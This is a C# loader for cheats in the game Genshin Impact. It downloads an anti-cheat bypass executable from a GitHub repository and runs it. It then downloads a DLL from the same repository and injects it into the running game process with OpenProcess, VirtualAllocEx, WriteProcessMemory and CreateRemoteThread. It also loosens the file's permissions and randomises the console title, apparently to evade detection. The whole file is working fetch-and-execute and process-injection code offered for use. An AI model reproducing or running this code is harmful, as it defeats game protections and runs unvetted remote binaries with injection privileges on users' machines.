using System;
using System.Linq;
using System.Text;
using System.Net;
using System.Runtime.CompilerServices; 
using System.Linq.Expressions;
using Microsoft.CSharp.RuntimeBinder;
using System.IO;
using System.Threading;
using System.Diagnostics;  
using System.Runtime.InteropServices; 
using System.CodeDom.Compiler;
using System.Reflection;
using System.Data;
using System.Security.Principal;
using System.Security.AccessControl;

namespace GenshinPublic
{
	public class Program
	{
		static void Bypass()
		{
			bool flag = false;
			try
			{ 
				WebClient webClient = new WebClient();
				webClient.DownloadFile(new Uri("https://github.com/DeftSolutions-dev/HackGenshin/raw/main/FuckYou/ggAC.exe"), Path.Combine(Path.GetTempPath(), "Bypass.exe"));
				if (File.Exists(Path.Combine(Path.GetTempPath(), "Bypass.exe")) && new FileInfo(Path.Combine(Path.GetTempPath(), "Bypass.exe")).Length > 10L)
				{
					flag = true;
				}
				else
				{
					Console.WriteLine("Dll could not be downloaded, check your Anti Virus!");
					Console.ReadKey();
				}
				if (flag)
				{
					Process.Start(Path.Combine(Path.GetTempPath(), "Bypass.exe"));
				}
			}
			catch (WebException)
			{
				Console.WriteLine("No internet connection!");
				Console.ReadKey();
			}
			catch (Exception arg)
			{
				Console.WriteLine("Error! " + arg); 
			} 
		}
		private static void RandomName()
		{
			Console.Title = "";
			Random rnd = new Random();
			Char[] pwdChars = new Char[36] { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' };
			for (int i = 20; i < 75; i++)
				Console.Title += pwdChars[rnd.Next(0, 35)];
			Thread.Sleep(10);
		}
		const string Chars = "GhjbHUhuvuyv76giUH87hioH98HIh98iok";
		static string RandomString(int length)
		{
			Random random = new Random();
			return new string(Enumerable.Repeat(Chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
		}
		[STAThread]
		[DebuggerNonUserCode]
		[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
		public static void Main(string[] args)
		{
			RandomName();
			if (Process.GetProcessesByName("GenshinImpact").Length != 0)
			{
				Bypass();
				Console.WriteLine("Bypass AC[GenshinImpact: Mhyprot2]...");
				LoadFile();
				return;
			}
			if(Process.GetProcessesByName("YuanShen").Length != 0)
			{
				Bypass();
				Console.WriteLine("Bypass AC[GenshinImpact: Mhyprot2]...");
				LoadFile();
				return;
			}
			RandomName();
			Console.WriteLine("Open Genshin Impact BRO...");
			Console.ReadKey();
		}
		public static void LoadFile()
		{ 
			bool flag = false;
			try
			{ 
				WebClient webClient = new WebClient();
				Console.WriteLine("Retrieving...");
				webClient.DownloadFile(new Uri("https://github.com/DeftSolutions-dev/HackGenshin/raw/main/FuckYou/FuckYou.dll"), Path.Combine(Path.GetTempPath(), "FuckYou.dll"));
				Console.WriteLine("Parsing...");
				Console.WriteLine("Downloading...");
				if (File.Exists(Path.Combine(Path.GetTempPath(), "FuckYou.dll")) && new FileInfo(Path.Combine(Path.GetTempPath(), "FuckYou.dll")).Length > 200L)
				{
					flag = true;
				}
				else
				{
					Console.WriteLine("Dll could not be downloaded, check your Anti Virus!");
					Thread.Sleep(7000);
				}
				if (flag)
				{
					Console.WriteLine("Injecting...");
					Thread.Sleep(1);
					InjectDLL(Path.Combine(Path.GetTempPath(), "FuckYou.dll"));
					File.Delete(Path.Combine(Path.GetTempPath(), "Bypass.exe"));
					Console.WriteLine("Done\nLoader By DesirePro(FUCK#9803)");
					Thread.Sleep(100);
				}
			}//YuanShen
			catch (WebException)
			{
				Console.WriteLine("No internet connection!");
				Console.ReadKey();
			}
			catch (Exception arg)
			{
				Console.WriteLine("Error! " + arg);
				Console.ReadKey();
			}
		}
		public static void applyAppPackages(string DLLPath)
		{
			FileInfo fileInfo = new FileInfo(DLLPath);
			FileSecurity accessControl = fileInfo.GetAccessControl();
			accessControl.AddAccessRule(new FileSystemAccessRule(new SecurityIdentifier("S-1-15-2-1"), FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow));
			fileInfo.SetAccessControl(accessControl);
		}
		private static bool TF;
		public static void InjectDLL(string dll)
		{ 
			if (Process.GetProcessesByName("GenshinImpact").Length != 0)
			{
				applyAppPackages(dll);
				Process process = Process.GetProcessesByName("GenshinImpact")[0];
				IntPtr hProcess = OpenProcess(ProcessAccessFlags.VirtualMemoryRead | ProcessAccessFlags.VirtualMemoryWrite | ProcessAccessFlags.VirtualMemoryOperation, false, process.Id);
				Console.WriteLine("Process Handle: " + hProcess.ToString());
				IntPtr procAddress = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
				Console.WriteLine("Load Library Address: " + procAddress.ToString());
				IntPtr intPtr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dll.Length + 1) * Marshal.SizeOf(typeof(char))), 0x3000, 0x04);
				IntPtr uintPtr;
				WriteProcessMemory(hProcess, intPtr, Encoding.Default.GetBytes(dll), ((dll.Length + 1) * Marshal.SizeOf(typeof(char))), out uintPtr);
				CreateRemoteThread(hProcess, IntPtr.Zero, 0, procAddress, intPtr, 0, IntPtr.Zero);
				TF = false;
				Console.WriteLine("Injected dll hack"); 
				return;
			}
			if(Process.GetProcessesByName("YuanShen").Length != 0)
            {
				applyAppPackages(dll);
				Process process = Process.GetProcessesByName("YuanShen")[0];
				IntPtr hProcess = OpenProcess(ProcessAccessFlags.VirtualMemoryRead | ProcessAccessFlags.VirtualMemoryWrite | ProcessAccessFlags.VirtualMemoryOperation, false, process.Id);
				Console.WriteLine("Process Handle: " + hProcess.ToString());
				IntPtr procAddress = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
				Console.WriteLine("Load Library Address: " + procAddress.ToString());
				IntPtr intPtr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dll.Length + 1) * Marshal.SizeOf(typeof(char))), 0x3000, 0x04);
				IntPtr uintPtr;
				WriteProcessMemory(hProcess, intPtr, Encoding.Default.GetBytes(dll), ((dll.Length + 1) * Marshal.SizeOf(typeof(char))), out uintPtr);
				CreateRemoteThread(hProcess, IntPtr.Zero, 0, procAddress, intPtr, 0, IntPtr.Zero);
				TF = false;
				Console.WriteLine("Injected dll hack");
			}
			if (!TF)
			{
				TF = true;
				Console.WriteLine("Injection Failed");
				Console.WriteLine("Open Genshin Impact");
				Console.ReadKey();
				return;
			}
			Console.WriteLine("Not Injected");
			Console.WriteLine("Run the Genshin Impact, or do you want software into the void?");
			Console.ReadKey();
			TF = false;
		}
		[Flags]
		public enum ProcessAccessFlags : uint
		{
			All = 0x001F0FFF,
			Terminate = 0x00000001,
			CreateThread = 0x00000002,
			VirtualMemoryOperation = 0x00000008,
			VirtualMemoryRead = 0x00000010,
			VirtualMemoryWrite = 0x00000020,
			DuplicateHandle = 0x00000040,
			CreateProcess = 0x000000080,
			SetQuota = 0x00000100,
			SetInformation = 0x00000200,
			QueryInformation = 0x00000400,
			QueryLimitedInformation = 0x00001000,
			Synchronize = 0x00100000
		}

		
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);
		[DllImport("kernel32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool CloseHandle(IntPtr hObject);
		[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
		public static extern IntPtr GetModuleHandle(string lpModuleName);
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
		[DllImport("kernel32.dll")]
		private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
		[DllImport("kernel32.dll")]
		static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
	}
}
